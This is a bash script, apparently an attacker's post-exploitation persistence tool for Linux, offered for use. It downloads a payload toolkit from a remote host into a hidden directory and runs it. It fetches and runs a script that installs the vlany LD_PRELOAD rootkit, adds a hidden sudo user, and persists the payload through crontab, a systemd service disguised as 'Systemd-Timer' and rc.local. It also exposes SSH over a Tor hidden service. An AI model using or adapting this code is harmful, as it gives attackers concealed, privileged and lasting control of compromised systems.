#!/usr/bin/env bash
#***********************************************************#
#           Author        - pyCity                          #
#           Date          - 2/2/2019                        #
#           Version       - 1.0                             #
#                                                           #
#           Usage         - Run ./installer with one arg    #
#                           which is the choice of payload  #
#                           (e.g., ./installer rootkit)     #
#                         - Be sure to change the PAYLOAD   #
#                           variable to match your payload  #
#                                                           #
#           Description   - Linux post-exploitation         #
#                           persistence script              #
#                           (in progress)                   #
#***********************************************************#

# Make sure user is root
if [ "$EUID" -ne 0 ]; then
    echo "Need root, current id: $EUID"
    exit 1
fi

HIDDEN_DIR="/etc/.systemd/"           # Directory for binaries
PAY_NAME="Zero"#$                     # Name of binary to installs (preferably .elf)
PAYLOAD="${HIDDEN_DIR}${PAY_NAME}"    # Full path to payload


#**************************************************************************#
#                       Functions                                          #
#                                                                          #
#   unpack_kit             - Create hidden directory and download          #
#                            toolkit. Unpack tk.tar.gz and run payload     #
#                                                                          #
#   install_rootkit        - Download and install vlany                    #
#                            LD_Preload Rootkit (x86 and x86_64)           #
#                                                                          #
#   add_user               - Get username and password, create system      #
#                            level user with sudo privileges               #
#                                                                          #
#   add_cron               - add $PAYLOAD variable to crontab as           #
#                            @reboot sleep 100 && $PAYLOAD                 #
#                                                                          #
#   create_service         - Create a system service that restarts         #
#                            $PAYLOAD if it dies. Execute as root.         #
#                                                                          #
#   add_rc                 - Still in progress. Check if our payload       #
#                            exists in the rc.local file, if not then      #
#                            append it to file                             #
#                                                                          #
#   tor_hidden_ssh         - Still working on this one. Plan is to         #
#                            download and install tor with an openssh-     #
#                            server for SSH over hidden service            #
#**************************************************************************#


function unpack_kit {
    # Install/unpack backdoor
    mkdir ${HIDDEN_DIR} && cd ${HIDDEN_DIR}
    wget http://10.0.3.3/tk.tar.gz -P ${HIDDEN_DIR}
    tar -xzvf tk.tar.gz
    chmod +x ${PAYLOAD} && bash ${PAYLOAD}
}


function install_rootkit {
    wget https://gist.githubusercontent.com/mempodippy/d93fd99164bace9e63752afb791a896b/raw/6b06d235beac8590f56c47b7f46e2e4fac9cf584/quick_install.sh -O /tmp/quick_install.sh &&
    chmod +x /tmp/quick_install.sh && /tmp/quick_install.sh
}


function add_user {
    echo "Adding a user..."
    read -p "Username: " USER
    read -s -p "Password: " PASSWD
    egrep "^$USER" /etc/passwd >/dev/null

    # Check that user exists before adding user
    if [ $? -eq 0 ]; then
        echo User already exists && exit 2
    else
        adduser --system --shell /bin/bash --no-create-home ${USER} && usermod -aG sudo ${USER}
        echo "$USER:$PASSWD" | chpasswd
        [ $? -eq 0 ] && echo "Sudo user ${USER} has been added" || echo "Failed to add sudo user"
    fi
}



function add_cron {
    (crontab -l ; echo "@reboot sleep 200 && $PAYLOAD")|crontab 2> /dev/null
}



function create_service {
    touch /lib/systemd/system/systemd-Zero.service
    cd /lib/systemd/system/
    echo -e "[Unit]\nDescription=Systemd-Timer\nAfter=network.target\n\n[Service]\nType=simple\nUser=root\nExecStart=${PAYLOAD}\nRestart=on-failure\n\n[Install]\nWantedBy=default.target" > systemd-Zero.service
    systemctl daemon-reload && sleep 5
    systemctl enable systemd-Zero.service
    systemctl start systemd-Zero.service
}


# Not finished!
function add_rclocal {
    if [ "bash /root/.systemd/Zero &" = "$(cat /etc/rc.local | grep [Z]ero)" ]; then
        echo "Already exists"
    else
        echo "bash /root/.systemd/Zero &" >> /etc/rc.local
    fi
}


# Not finished!
function hidden_service {
    apt-get install git openssh-server tor python-pip -y
    echo "HiddenServiceDir /var/lib/tor/secret_service/; HiddenServicePort 22 127.0.0.1:22;" >> /etc/tor/torrc
    systemctl restart tor.service && systemctl enable tor.service
    URL=$(cat /var/lib/tor/secret_service/hostname)
    echo "$URL is your new client address."
}



# If user enters 0 args, go ahead and install toolkit
if [ $# -eq 0 ];then
    echo "Unpacking toolkit.." && unpack_kit

    echo "Select an option:"
    echo "1 for rootkit installer"
    echo "2 to add sudo user"
    echo "3 to add payload to cron"
    echo "4 to add system service"
    read answer
    if [ $answer -eq 1 ]; then
        install_rootkit
    elif [ $answer -eq 2 ]; then
        add_user
    elif [ $answer -eq 3 ]; then
        add_cron
    elif [ $answer -eq 4 ]; then
        create_service
    else
        echo "Not a valid number. Exiting."
        exit 1
    fi

elif [ $1 -eq "rootkit" ]; then
    echo "Installing vlany..."
    install_rootkit
elif [ $1 -eq "add_user" ]; then
    echo "Adding sudo user..."
    add_user
elif [ $1 -eq "add_cron" ]; then
    "Adding payload to crontab..."
    add_cron
elif [ $1 -eq "add_service" ]; then
    echo "Creating system service..."
    create_service


fi
